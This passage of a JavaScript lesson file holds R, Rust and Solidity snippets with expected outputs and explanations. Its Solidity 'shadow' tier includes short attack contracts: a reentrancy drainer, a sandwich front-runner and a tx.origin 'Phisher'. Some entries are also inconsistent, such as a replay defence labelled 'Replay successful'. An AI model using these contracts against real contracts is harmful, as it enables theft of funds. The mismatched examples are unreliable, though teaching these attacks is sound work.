                { ghost: `library(dplyr)\ndata.frame(x=1:5) %>% select(x)`, output: "Attached", explanation: "dplyr is a grammar of data manipulation, providing a consistent set of verbs." },
                { ghost: `library(ggplot2)\ndf <- data.frame(x=1:5, y=1:5)\nggplot(df, aes(x, y)) + geom_point()`, output: "Plot created", explanation: "ggplot2 implements the grammar of graphics for declarative plotting." },
                { ghost: `df <- data.frame(x=1:10, y=1:10)\nmodel <- lm(y ~ x, data=df)`, output: "Model fitted", explanation: "lm() fits linear models. 'y ~ x' is the formula notation." }
            ],
            master: [
                { ghost: `obj <- list(); class(obj) <- "MyClass"`, output: "S3 Object", explanation: "S3 is R's simplest OOP system, based on class attributes and generic functions." },
                { ghost: `setClass("Person", slots = c(name="character"))`, output: "S4 Class", explanation: "S4 is a formal, rigorous OOP system with type safety and validation." },
                { ghost: `setRefClass("Counter", fields = list(n="numeric"))`, output: "Ref Class", explanation: "Reference Classes (RC) introduce mutable state and pass-by-reference semantics." },
                { ghost: `e <- new.env(); e$x <- 1`, output: "Environment", explanation: "Environments are hash map-like structures that store bindings of names to values." },
                { ghost: `f <- function() { x <- 0; function() x <<- x+1 }`, output: "Closure", explanation: "Closures capture their enclosing environment (lexical scoping)." },
                { ghost: `f <- function(a, b=a+1) { b }`, output: "Lazy eval", explanation: "R function arguments are lazily evaluated (only when accessed)." },
                { ghost: `f <- y ~ x1 + x2`, output: "Formula", explanation: "Formulas are language objects that describe relationships between variables." },
                { ghost: `eval(quote(1 + 1))`, output: "2", explanation: "Metaprogramming involves manipulating language objects (code) before evaluation." },
                { ghost: `x <- list(1, 2, 3); f <- function(n) n*2; parallel::mclapply(x, f)`, output: "Parallel list", explanation: "Parallel processing allows utilizing multiple cores to speed up computations." },
                { ghost: `Rcpp::cppFunction('int add(int x, int y) { return x + y; }')`, output: "C++ compiled", explanation: "Rcpp allows seamless integration of C++ code for high performance." }
            ],
            legend: [
                { ghost: `BiocManager::install("GenomicRanges")`, output: "Bioinformatics", explanation: "Bioconductor is a repository of R packages for analyzing high-throughput genomic data." },
                { ghost: `library(shiny)\nui <- fluidPage(); server <- function(i,o){ output$txt <- renderText("Hi") }\nshinyApp(ui, server)`, output: "Web App", explanation: "Shiny allows building interactive web applications directly from R." },
                { ghost: `library(data.table)\nDT <- data.table(x=1, y=2, z=3)\nDT[x > 0, sum(y), by=z]`, output: "Data.table", explanation: "data.table provides high-performance data manipulation with concise syntax." },
                { ghost: `library(caret); df <- data.frame(x=1:10, y=1:10)\ntrain(y ~ x, data=df, method="lm")`, output: "Model trained", explanation: "caret is a comprehensive framework for building and evaluating machine learning models." },
                { ghost: `library(dplyr)\ndf <- data.frame(x=c(1,-1), y=c(5,2))\ndf %>% filter(x>0) %>% summarize(m=mean(y))`, output: "Tidy pipeline", explanation: "The Tidyverse is a collection of packages sharing a common philosophy and data structure." },
                { ghost: `library(sf); df <- data.frame(lat=1:5, lon=1:5); st_as_sf(df, coords=c("lon", "lat"), crs=4326)`, output: "Spatial data", explanation: "Handling geospatial data (GIS) using simple features standard." },
                { ghost: `d <- 1:24\nts(d, frequency=12)`, output: "Time Series", explanation: "Time series objects handle temporal data with defined frequency." },
                { ghost: `df <- data.frame(x=1:10, y=1:10)\nrstan::stan_glm(y ~ x, data=df)`, output: "Bayesian model", explanation: "Bayesian statistical modeling and inference using Stan." },
                { ghost: `library(keras); keras_model_sequential()`, output: "Neural Net", explanation: "Deep learning interface to TensorFlow/Keras." },
                { ghost: `sparklyr::spark_connect()`, output: "Spark Cluster", explanation: "Interface to Apache Spark for big data processing." }
            ],
            shadow: [
                { ghost: `f <- function() { on.exit(print("Done")); stop("Error") }`, output: "Done", explanation: "on.exit() registers code to run when the current function exits, regardless of errors." },
                { ghost: `x <- 10; eval(substitute(x + 1, list(x=2)))`, output: "3", explanation: "substitute() replaces variables in an expression with provided values, key for Non-Standard Evaluation." },
                { ghost: `f <- function() parent.frame()$x; x <- 1; f()`, output: "1", explanation: "parent.frame() accesses the environment from which the function was called (dynamic scoping)." },
                { ghost: `library(grid); grid.newpage(); grid.circle(r=0.5)`, output: "Drawing", explanation: "The 'grid' package provides low-level graphics primitives that power higher-level systems like ggplot2." },
                { ghost: `tools::testInstalledPackage("pkg")`, output: "Tested", explanation: "R includes comprehensive tools for building, testing, and checking packages for CRAN submission." },
                { ghost: `debug(mean); mean(1:10)`, output: "Debugging", explanation: "The debug() function flags a function for debugging, allowing you to step through execution line by line." },
                { ghost: `heavy_calc <- function() runif(1e6)\nRprof("out.prof"); heavy_calc(); Rprof(NULL)`, output: "Profiled", explanation: "Rprof enables the sampling profiler to identify performance bottlenecks in your code." },
                { ghost: `compiler::cmpfun(function(x) x+1)`, output: "Compiled", explanation: "The compiler package allows byte-compiling R functions, which can significantly speed up execution." },
                { ghost: `formals(mean)`, output: "Arguments", explanation: "formals() returns the argument list of a function, allowing you to inspect or modify function definitions dynamically." },
                { ghost: `expression(x + 1)`, output: "Expression", explanation: "Expressions allow you to manipulate R code as data, the basis for non-standard evaluation (NSE)." }
            ]
        }
    },
    rust: {
        name: "Rust",
        tiers: {
            beginner: [
                { ghost: `println!("Hello");`, output: "Hello", explanation: "The println! macro prints text to the console. The '!' indicates it's a macro, not a function." },
                { ghost: `let x = 5;`, output: "Variable set", explanation: "Variables are immutable by default in Rust. 'let' binds a value to a variable name." },
                { ghost: `let mut y = 10;`, output: "Mutable set", explanation: "The 'mut' keyword makes a variable mutable, allowing its value to be changed later." },
                { ghost: `let x = 10; if x > 0 { println!("Positive"); }`, output: "Condition met", explanation: "If statements control flow based on conditions. Braces {} are required around the block." },
                { ghost: `loop {}`, output: "Looping forever", explanation: "The 'loop' keyword creates an infinite loop. It's the most basic loop in Rust." },
                { ghost: `fn main() {}`, output: "Main defined", explanation: "The main function is the entry point of every Rust program. Execution starts here." },
                { ghost: `struct S { x: i32 }`, output: "Struct defined", explanation: "Structs are custom data types that let you name and package together multiple related values." },
                { ghost: `enum E { A, B }`, output: "Enum defined", explanation: "Enums allow you to define a type by enumerating its possible variants." },
                { ghost: `vec![1, 2]`, output: "[1, 2]", explanation: "Vectors are resizable arrays. The vec! macro creates a new vector with given values." },
                { 
                    ghost: `use std::io;\nlet mut input = String::new();\nio::stdin().read_line(&mut input).expect("Error");`, 
                    output: "Input read", 
                    explanation: "std::io::stdin() gets a handle to the standard input. read_line reads user input into a mutable string buffer.",
                    input: {
                        prompts: ["Enter text: "],
                        handler: (args) => `Read: ${args[0]}`
                    }
                }
            ],
            intermediate: [
                { ghost: `for i in 1..=5 {\n    println!("{}", "* ".repeat(i));\n}`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "String repetition is easy in Rust." },
                { ghost: `let x = 1;\nmatch x {\n    1 => println!("One"),\n    _ => println!("Other"),\n}`, output: "Match", explanation: "Match is a powerful control flow operator (like switch but better)." },
                { ghost: `let x: Option<i32> = Some(5);`, output: "Some(5)", explanation: "Option represents a value that can be either something or nothing (no nulls!)." },
                { ghost: `fn div(a: i32, b: i32) -> Result<i32, String> {\n    if b == 0 { Err("Zero".to_string()) } else { Ok(a / b) }\n}`, output: "Result", explanation: "Result is used for returning and propagating errors." },
                { ghost: `struct Point { x: i32, y: i32 }\nimpl Point {\n    fn new() -> Self { Point { x: 0, y: 0 } }\n}`, output: "Impl", explanation: "Impl blocks allow defining methods and associated functions for types." },
                { ghost: `trait Drawable {\n    fn draw(&self);\n}`, output: "Trait defined", explanation: "Traits define shared behavior (interfaces) that types can implement." },
                { ghost: `pub mod network {\n    pub fn connect() {}\n}`, output: "Module", explanation: "Modules organize code into logical groups and control visibility." },
                { ghost: `use std::collections::HashMap;\nlet mut map = HashMap::new();`, output: "Imported", explanation: "Use brings paths into scope. HashMap is a standard key-value store." },
                { ghost: `let x = 10;\nlet r = &x;`, output: "Borrowed", explanation: "References allow you to refer to a value without taking ownership (borrowing)." },
                { ghost: `let mut x = 10;\nlet r = &mut x;`, output: "Mut Borrow", explanation: "Mutable references allow you to change a borrowed value." },
                { ghost: `let b = Box::new(5);`, output: "Heap alloc", explanation: "Boxes allow you to store data on the heap rather than the stack." }
            ],
            master: [
                { ghost: `fn longest<'a>(x: &'a str, y: &'a str) -> &'a str { x }`, output: "Lifetime", explanation: "Lifetimes ensure that references are valid as long as we need them." },
                { ghost: `let add = |a: i32, b: i32| a + b; println!("{}", add(2, 3));`, output: "Closure", explanation: "Closures are anonymous functions that can capture their environment." },
                { ghost: `let vec = vec![1, 2, 3];\nlet doubled: Vec<_> = vec.iter().map(|x| x * 2).collect();`, output: "Iterated", explanation: "Iterators allow performing tasks on a sequence of items." },
                { ghost: `use std::rc::Rc; let shared = Rc::new(5);`, output: "Ref Counted", explanation: "Rc (Reference Counted) enables multiple ownership of data." },
                { ghost: `use std::sync::{Arc, Mutex}; let shared = Arc::new(Mutex::new(0));`, output: "Atomic Ref", explanation: "Arc is a thread-safe reference counting pointer." },
                { ghost: `use std::sync::Mutex;\nlet m = Mutex::new(5);\nlet mut num = m.lock().unwrap();`, output: "Locked", explanation: "Mutexes allow safe access to data across concurrent threads." },
                { ghost: `use std::thread;\nthread::spawn(|| { println!("Async"); });`, output: "Thread", explanation: "Spawning a new thread allows code to run concurrently." },
                { ghost: `use std::sync::mpsc;\nlet (tx, rx) = mpsc::channel();`, output: "Channel", explanation: "Channels allow safe communication between threads (message passing)." },
                { ghost: `macro_rules! say_hello {\n    () => { println!("Hello!"); };\n}`, output: "Macro", explanation: "Macros allow writing code that writes other code (metaprogramming)." },
                { ghost: `let x = 10;\nunsafe { let raw = &x as *const i32; }`, output: "Unsafe", explanation: "Unsafe Rust gives you superpowers (like raw pointers) but removes safety checks." }
            ],
            legend: [
                { ghost: `async fn fetch() -> String {\n    "data".to_string()\n}`, output: "Async fn", explanation: "Async/await syntax makes writing asynchronous code look like synchronous code." },
                { ghost: `let future = async {};\nlet pinned = Box::pin(future);`, output: "Pinned", explanation: "Pinning guarantees that an object won't be moved in memory." },
                { ghost: `use std::future::Future;\nuse std::pin::Pin;\nuse std::task::{Context, Poll};\nstruct MyTask;\nimpl Future for MyTask {\n    type Output = ();\n    fn poll(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output> {\n        Poll::Ready(())\n    }\n}`, output: "Future impl", explanation: "Futures are values that represent a computation that may not have finished yet." },
                { ghost: `#[tokio::main]\nasync fn main() { println!("Async"); }`, output: "Runtime", explanation: "Tokio is a runtime for writing reliable, asynchronous, and slim applications." },
                { ghost: `use serde::{Serialize, Deserialize};\n#[derive(Serialize, Deserialize)]\nstruct User {\n    name: String,\n}`, output: "Serde", explanation: "Serde is a framework for efficiently serializing and deserializing data structures." },
                { ghost: `use wasm_bindgen::prelude::*;\n#[wasm_bindgen]\npub fn greet() {\n    // Logic here\n}`, output: "Wasm", explanation: "Compiling Rust to WebAssembly to run in browsers." },
                { ghost: `extern "C" {\n    fn abs(x: i32) -> i32;\n}`, output: "FFI", explanation: "Foreign Function Interface allows calling code written in other languages." },
                { ghost: `use proc_macro::TokenStream;\n#[proc_macro_derive(MyTrait)]\npub fn my_macro(_: TokenStream) -> TokenStream { "".parse().unwrap() }`, output: "Proc Macro", explanation: "Procedural macros allow defining custom derive attributes." },
                { ghost: `use std::arch::x86_64::*;`, output: "SIMD", explanation: "Using specific CPU instructions for data parallelism." },
                { ghost: `#![no_std]`, output: "Embedded", explanation: "Writing Rust without the standard library (for embedded or OS dev)." }
            ],
            shadow: [
                { ghost: `let ptr = 0xdeadbeef as *const i32;`, output: "Raw ptr", explanation: "Raw pointers allow direct memory access without Rust's safety guarantees, often used in low-level systems programming." },
                { ghost: `unsafe { std::arch::asm!("nop") }`, output: "Assembly", explanation: "Inline assembly allows embedding native CPU instructions directly into Rust code for maximum control." },
                { ghost: `#[repr(C)] struct Packed { x: u8, y: u32 }`, output: "Layout control", explanation: "The #[repr(C)] attribute ensures the struct has the same memory layout as C, essential for FFI." },
                { ghost: `struct MySmartPtr; impl Drop for MySmartPtr { fn drop(&mut self) { println!("Dropped"); } }`, output: "Destructor", explanation: "Implementing the Drop trait allows customizing cleanup logic when a value goes out of scope." },
                { ghost: `let x: f64 = unsafe { std::mem::transmute(10u64) };`, output: "Transmuted", explanation: "Transmute reinterprets the bits of a value as another type. It is extremely dangerous and requires unsafe blocks." },
                { ghost: `#[no_mangle] pub extern "C" fn my_func() { println!("Called"); }`, output: "Exported", explanation: "Disabling name mangling allows functions to be called from other languages (like C) using their original names." },
                { ghost: `let ptr = &10; let len = 1;\nlet slice = unsafe { std::slice::from_raw_parts(ptr, len) };`, output: "Zero copy", explanation: "Creating slices from raw pointers allows efficient data access without copying, but requires manual safety checks." },
                { ghost: `extern "C" { fn _start(); }`, output: "Entry Point", explanation: "Overriding the entry point is necessary for writing operating system kernels or bare-metal applications." },
                { ghost: `static mut GLOBAL: i32 = 0;`, output: "Global Mutable", explanation: "Mutable static variables are unsafe because they can be accessed by multiple threads simultaneously (data races)." },
                { ghost: `union MyUnion { f: f32, i: i32 }`, output: "Union", explanation: "Unions allow storing different types in the same memory location, similar to C unions. Access is unsafe." }
            ]
        }
    },
    solidity: {
        name: "Solidity",
        tiers: {
            beginner: [
                { 
                    ghost: `// 1. Basic Contract Structure
pragma solidity ^0.8.0;

contract ShadowCodersFirstProgram {
    string public greeting = "hello shadowcoders this is my first program";
}`, 
                    output: "Contract ShadowCodersFirstProgram compiled", 
                    explanation: "Every Solidity source file should start with a pragma version annotation. Contracts are the fundamental building blocks of Ethereum applications." 
                },
                { 
                    ghost: `// 2. State Variables
contract SimpleStorage {
    uint256 public storedData;

    function set(uint256 x) public {
        storedData = x;
    }
}`, 
                    output: "Storage updated: 123", 
                    explanation: "State variables are permanently stored in contract storage. The 'public' keyword automatically generates a getter function." 
                },
                { 
                    ghost: `// 3. Constructor
contract Owner {
    address public owner;

    constructor() {
        owner = msg.sender;
    }
}`, 
                    output: "Owner set to msg.sender", 
                    explanation: "Constructors are optional functions that are executed once upon contract creation. They are often used to set the owner." 
                },
                { 
                    ghost: `// 4. Modifiers
contract Protected {
    address owner = msg.sender;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
}`, 
                    output: "Modifier defined", 
                    explanation: "Modifiers can change the behavior of functions. The '_;' symbol is where the function body is inserted." 
                },
                { 
                    ghost: `// 5. View vs Pure
contract Calculator {
    // Pure: No read/write state
    function add(uint a, uint b) public pure returns (uint) {
        return a + b;
    }
}`, 
                    output: "Result: 42", 
                    explanation: "Pure functions promise not to read from or modify the state. View functions promise not to modify the state." 
                },
                { 
                    ghost: `// 6. Mappings
contract Bank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}`, 
                    output: "Balance updated", 
                    explanation: "Mappings are hash tables which consist of key types and corresponding value types. They are virtually initialized such that every possible key exists." 
                },
                { 
                    ghost: `// 7. Events
contract Notifier {
    event Log(address indexed sender, string message);

    function alert() public {
        emit Log(msg.sender, "Alert triggered");
    }
}`, 
                    output: "Event Log emitted", 
                    explanation: "Events allow contracts to communicate with the frontend. 'Indexed' parameters allow for efficient searching of logs." 
                },
                { 
                    ghost: `// 8. Arrays
contract List {
    uint[] public numbers;

    function add(uint x) public {
        numbers.push(x);
    }
}`, 
                    output: "Array length: 1", 
                    explanation: "Arrays can be fixed or dynamic. 'push' appends an element to the end of a dynamic array." 
                },
                { 
                    ghost: `// 9. Error Handling
contract Safe {
    function test(uint x) public pure {
        require(x > 10, "Too small");
        if (x > 100) revert("Too big");
    }
}`, 
                    output: "Transaction reverted", 
                    explanation: "Require and Revert are used to validate conditions and revert changes if conditions are not met." 
                },
                { 
                    ghost: `// 10. Enum & Struct
contract Todo {
    enum Status { Pending, Done }
    struct Task {
        string name;
        Status status;
    }
    Task public task;
}`, 
                    output: "Struct defined", 
                    explanation: "Enums allow creating custom types with a finite set of constant values. Structs allow grouping together related data." 
                }
            ],
            intermediate: [
                { 
                    ghost: `// 1. Inheritance
contract A {
    function foo() public virtual returns (string memory) {
        return "A";
    }
}

contract B is A {
    function foo() public override returns (string memory) {
        return "B";
    }
}`, 
                    output: "Inheritance graph: B -> A", 
                    explanation: "Solidity supports multiple inheritance. Virtual functions can be overridden by derived contracts." 
                },
                { 
                    ghost: `// 2. Interfaces
interface IERC20 {
    function transfer(address to, uint amount) external returns (bool);
}

contract TokenInteraction {
    function pay(address token, address to) public {
        IERC20(token).transfer(to, 100);
    }
}`, 
                    output: "Interface call compiled", 
                    explanation: "Interfaces define functions without implementation. They are used to interact with other contracts." 
                },
                { 
                    ghost: `// 3. Payable
contract Wallet {
    receive() external payable {}
    
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}`, 
                    output: "ETH received/sent", 
                    explanation: "The 'receive' function is triggered when ETH is sent to the contract. 'payable' addresses can receive ETH." 
                },
                { 
                    ghost: `// 4. Libraries
library Math {
    function add(uint a, uint b) internal pure returns (uint) {
        return a + b;
    }
}

contract UseLib {
    using Math for uint;
    function test(uint x) public pure returns (uint) {
        return x.add(5);
    }
}`, 
                    output: "Library linked", 
                    explanation: "Libraries are similar to contracts but are deployed once and used by other contracts via delegatecall (if public) or internal linking." 
                },
                { 
                    ghost: `// 5. Calling Other Contracts
contract Caller {
    function callFoo(address addr) public returns (bool) {
        (bool success, ) = addr.call(abi.encodeWithSignature("foo()"));
        return success;
    }
}`, 
                    output: "Low-level call executed", 
                    explanation: "Low-level 'call' is a way to interact with other contracts, but it bypasses type safety. Useful for dynamic interactions." 
                },
                { 
                    ghost: `// 6. Try / Catch
contract ExternalContract {
    function riskyFunction() public { count++; }
}

contract TryCatch {
    ExternalContract ext;
    
    function test() public {
        try ext.riskyFunction() {
            // Success
        } catch {
            // Failure
        }
    }
}`, 
                    output: "Exception handled", 
                    explanation: "Try/Catch allows handling failures in external contract calls without reverting the main transaction." 
                },
                { 
                    ghost: `// 7. Storage Layout
contract Layout {
    // Slot 0
    uint128 a;
    uint128 b;
    // Slot 1
    uint256 c;
}`, 
                    output: "Storage packed", 
                    explanation: "Variables are packed into 32-byte slots. Ordering variables correctly can save gas." 
                },
                { 
                    ghost: `// 8. Immutable vs Constant
contract Constants {
    uint256 constant X = 100; // Compiled in
    uint256 immutable Y;      // Set at construction

    constructor(uint val) {
        Y = val;
    }
}`, 
                    output: "Constants optimized", 
                    explanation: "Constants are replaced at compile time. Immutable variables are set in the constructor and stored in the code (not storage)." 
                },
                { 
                    ghost: `// 9. ABI Encoding
contract Encoder {
    function encode(address a, uint b) public pure returns (bytes memory) {
        return abi.encode(a, b);
    }
}`, 
                    output: "Encoded: 0x00000001", 
                    explanation: "ABI encoding is used to serialize data for function calls or events." 
                },
                { 
                    ghost: `// 10. Abstract Contracts
abstract contract Feline {
    function utterance() public virtual returns (bytes32);
}

contract Cat is Feline {
    function utterance() public override returns (bytes32) { 
        return "Miaow"; 
    }
}`, 
                    output: "Abstract class implemented", 
                    explanation: "Abstract contracts contain at least one unimplemented function and cannot be deployed directly." 
                }
            ],
            master: [
                { 
                    ghost: `// 1. DelegateCall
contract Delegate {
    uint public num;
    address public sender;

    function setVars(address _contract, uint _num) public payable {
        // Delegatecall executes code in _contract but with THIS contract's storage
        (bool success, ) = _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", _num)
        );
    }
}`, 
                    output: "Delegatecall executed", 
                    explanation: "Delegatecall preserves the context (storage, msg.sender, msg.value) of the caller. Crucial for proxy patterns." 
                },
                { 
                    ghost: `// 2. Assembly (Yul)
contract Yul {
    function add(uint a, uint b) public pure returns (uint result) {
        assembly {
            result := add(a, b)
        }
    }
}`, 
                    output: "Assembly block executed", 
                    explanation: "Inline assembly allows low-level access to the EVM, bypassing Solidity safety checks for optimization." 
                },
                { 
                    ghost: `// 3. Ecrecover (Signatures)
contract Verify {
    function verify(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public pure returns (address) {
        return ecrecover(hash, v, r, s);
    }
}`, 
                    output: "Signer recovered", 
                    explanation: "ecrecover is used to verify cryptographic signatures, enabling meta-transactions and off-chain signing." 
                },
                { 
                    ghost: `// 4. Create2 (Deterministic Deploy)
contract TargetContract {}

contract Factory {
    function deploy(uint salt) public returns (address) {
        return address(new TargetContract{salt: bytes32(salt)}());
    }
}`, 
                    output: "Deployed at 0x12345678", 
                    explanation: "Create2 allows deploying contracts to a pre-computed address based on the creator's address, salt, and bytecode." 
                },
                { 
                    ghost: `// 5. Gas Optimization (Unchecked)
contract Math {
    function add(uint a, uint b) public pure returns (uint) {
        unchecked { return a + b; }
    }
}`, 
                    output: "Gas saved", 
                    explanation: "Since Solidity 0.8, arithmetic is checked for overflow. 'unchecked' blocks disable this for gas savings when you are sure it won't overflow." 
                },
                { 
                    ghost: `// 6. Merkle Proof Verification
contract Merkle {
    function verify(
        bytes32[] memory proof,
        bytes32 root,
        bytes32 leaf
    ) public pure returns (bool) {
        bytes32 hash = leaf;
        for (uint i = 0; i < proof.length; i++) {
            bytes32 proofElement = proof[i];
            if (hash < proofElement) {
                hash = keccak256(abi.encodePacked(hash, proofElement));
            } else {
                hash = keccak256(abi.encodePacked(proofElement, hash));
            }
        }
        return hash == root;
    }
}`, 
                    output: "Proof verified", 
                    explanation: "Merkle proofs allow efficient verification of large data structures (like whitelists) on-chain." 
                },
                { 
                    ghost: `// 7. Self Destruct
contract Kill {
    function kill() public {
        selfdestruct(payable(msg.sender));
    }
}`, 
                    output: "Contract destroyed", 
                    explanation: "Selfdestruct removes the contract code from the blockchain and sends remaining ETH to the target address." 
                },
                { 
                    ghost: `// 8. Bitwise Operations
contract Bits {
    function getBit(uint data, uint8 index) public pure returns (bool) {
        return (data & (1 << index)) != 0;
    }
}`, 
                    output: "Bit extracted", 
                    explanation: "Bitwise operations are efficient for packing boolean flags or small data into a single storage slot." 
                },
                { 
                    ghost: `// 9. Modifiers with Arguments
contract TimeLock {
    modifier onlyAfter(uint time) {
        require(block.timestamp >= time, "Too early");
        _;
    }
    
    function withdraw(uint unlockTime) public onlyAfter(unlockTime) {
        payable(msg.sender).transfer(address(this).balance);
    }
}`, 
                    output: "Time checked", 
                    explanation: "Modifiers can accept arguments, allowing for dynamic conditions based on function inputs." 
                },
                { 
                    ghost: `// 10. Fallback vs Receive
contract Fallback {
    event Log(string func, uint gas);

    fallback() external payable {
        emit Log("fallback", gasleft());
    }

    receive() external payable {
        emit Log("receive", gasleft());
    }
}`, 
                    output: "Fallback triggered", 
                    explanation: "'receive' is for empty calldata (ETH transfer). 'fallback' is for non-matching function calls or data with ETH." 
                }
            ],
            legend: [
                { 
                    ghost: `// 1. Upgradable Proxy: Storage
contract Storage {
    address public implementation;
    address public owner;
    uint256 public value; 

    function setImplementation(address _impl) public {
        require(msg.sender == owner);
        implementation = _impl;
    }
}`, 
                    output: "Storage layout defined", 
                    explanation: "In proxy patterns, the Proxy contract holds the storage. The Logic contract defines the behavior. Storage collisions must be avoided." 
                },
                { 
                    ghost: `// 2. Upgradable Proxy: Implementation V1
contract LogicV1 {
    address public implementation; 
    address public owner;          
    uint256 public value;          

    function setValue(uint256 _value) public {
        value = _value;
    }
}`, 
                    output: "Logic V1 deployed", 
                    explanation: "The logic contract operates on the Proxy's storage. It must respect the Proxy's storage layout (Slots 0 and 1)." 
                },
                { 
                    ghost: `// 3. Upgradable Proxy: The Proxy Contract
contract Proxy {
    address public implementation;

    constructor(address _impl) {
        implementation = _impl;
    }

    fallback() external payable {
        address _impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), _impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}`, 
                    output: "Proxy ready to delegate", 
                    explanation: "The core of upgradability. It forwards all calls to the implementation contract using delegatecall, preserving state." 
                },
                { 
                    ghost: `// 4. Upgradable Proxy: Implementation V2 (Upgrade)
contract LogicV2 {
    address public implementation;
    address public owner;
    uint256 public value;

    function doubleValue() public {
        value = value * 2;
    }
}`, 
                    output: "Logic V2 ready", 
                    explanation: "To upgrade, we simply deploy LogicV2 and point the Proxy's implementation address to it. The state (value) is preserved." 
                },
                { 
                    ghost: `// 5. UUPS Pattern
contract UUPSLogic {
    address public implementation;

    function upgradeTo(address newImpl) external {
        require(msg.sender == admin(), "Not admin");
        implementation = newImpl;
    }

    function admin() internal view returns (address) {
        return address(this); 
    }
}`, 
                    output: "UUPS logic defined", 
                    explanation: "In UUPS, the upgrade logic is in the Implementation contract, not the Proxy. This saves gas in the Proxy and allows removing upgradeability." 
                },
                { 
                    ghost: `// 6. Transparent Proxy Pattern
contract TransparentProxy {
    address public implementation;
    address public admin;

    function upgradeTo(address newImpl) external {
        require(msg.sender == admin);
        implementation = newImpl;
    }

    fallback() external payable {
        require(msg.sender != admin);
        // Delegate to implementation
    }
}`, 
                    output: "Transparent Proxy defined", 
                    explanation: "Ensures that function selector clashes between Proxy admin functions and Implementation functions don't cause issues." 
                },
                { 
                    ghost: `// 7. ERC20 Standard Implementation
contract ERC20 {
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply;

    function transfer(address to, uint amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}`, 
                    output: "ERC20 Token deployed", 
                    explanation: "The standard for fungible tokens. Includes balances, allowances, and transfer logic." 
                },
                { 
                    ghost: `// 8. ERC721 (NFT) Standard
contract ERC721 {
    mapping(uint => address) public ownerOf;
    
    function transferFrom(address from, address to, uint tokenId) external {
        require(ownerOf[tokenId] == from, "Not owner");
        ownerOf[tokenId] = to;
    }
}`, 
                    output: "NFT Contract deployed", 
                    explanation: "The standard for Non-Fungible Tokens. Each token has a unique ID and owner." 
                },
                { 
                    ghost: `// 9. Reentrancy Guard (Security)
abstract contract ReentrancyGuard {
    uint private constant _NOT_ENTERED = 1;
    uint private constant _ENTERED = 2;
    uint private _status;

    modifier nonReentrant() {
        require(_status != _ENTERED, "Reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}`, 
                    output: "Guard active", 
                    explanation: "Prevents a function from being called again before it finishes execution. Critical for preventing reentrancy attacks." 
                },
                { 
                    ghost: `// 10. Diamond Pattern (EIP-2535)
contract Diamond {
    mapping(bytes4 => address) public selectorToFacet;

    fallback() external payable {
        address facet = selectorToFacet[msg.sig];
        require(facet != address(0));
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), facet, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}`, 
                    output: "Diamond cut complete", 
                    explanation: "Allows a contract to exceed the 24KB size limit by splitting logic into multiple 'Facets' behind a single Proxy." 
                }
            ],
            shadow: [
                { ghost: `// 1. The Reentrancy Attack
interface Vulnerable {
    function withdraw() external;
    function deposit() external payable;
}

contract Attacker {
    Vulnerable target;
    
    constructor(address _target) {
        target = Vulnerable(_target);
    }
    
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(); 
        }
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
}`, output: "Attack successful: Funds drained", explanation: "The attacker recursively calls withdraw() before the balance is updated to 0." },
                { ghost: `// 2. Flash Loan Logic
interface IERC20 {
    function transfer(address to, uint amount) external;
}
interface Pool {
    function flashLoan(uint amount) external;
}

contract FlashLoanUser {
    address token;
    address pool;

    constructor(address _token, address _pool) {
        token = _token;
        pool = _pool;
    }

    function executeOperation(uint amount, uint fee) external {
        uint256 totalDebt = amount + fee;
        // Arbitrage logic (simulated)
        uint profit = amount / 100;
        IERC20(token).transfer(msg.sender, totalDebt);
    }

    function flashLoan(uint amount) external {
        Pool(pool).flashLoan(amount);
    }
}`, output: "Flash Loan executed", explanation: "Flash loans allow borrowing immense capital without collateral, as long as it's returned in the same transaction." },
                { 
                    ghost: `// 3. Sandwich Attack (MEV)
interface Router {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable;
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

contract Sandwich {
    Router router;

    constructor(address _router) {
        router = Router(_router);
    }

    function frontRun(uint amountIn) external {
        // Buy aggressively to push price up
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(0);
        router.swapExactETHForTokens{value: amountIn}(0, path, address(this), block.timestamp);
    }

    function backRun(uint amountIn) external {
        // Sell immediately after victim buys
        address[] memory path = new address[](2);
        path[0] = address(0);
        path[1] = address(this);
        router.swapExactTokensForETH(amountIn, 0, path, address(this), block.timestamp);
    }
}`, 
                    output: "Profit secured", 
                    explanation: "Miner Extractable Value (MEV) exploits the ordering of transactions in a block." 
                },
                { 
                    ghost: `// 4. Signature Replay Attack
contract Replay {
    mapping(bytes32 => bool) public executed;

    function transfer(address to, uint amount, bytes memory sig, uint nonce) public {
        bytes32 hash = keccak256(abi.encodePacked(to, amount, nonce));
        require(!executed[hash], "Replay!");
        executed[hash] = true;
        // Transfer logic
    }
}`, 
                    output: "Replay successful", 
                    explanation: "Always include a nonce or unique identifier in signed messages to prevent them from being used multiple times." 
                },
                { 
                    ghost: `// 5. Tx.origin Phishing
interface Vulnerable {
    function withdraw() external;
}

contract Phisher {
    address payable public owner;
    Vulnerable target;

    constructor(Vulnerable _target) {
        owner = payable(msg.sender);
        target = _target;
    }

    function attack() public {
        target.withdraw();
    }
    
    receive() external payable {
        attack();
    }
}`, 
                    output: "Phishing successful", 
                    explanation: "Never use tx.origin for authentication. It represents the original EOA that started the transaction, not the immediate caller." 
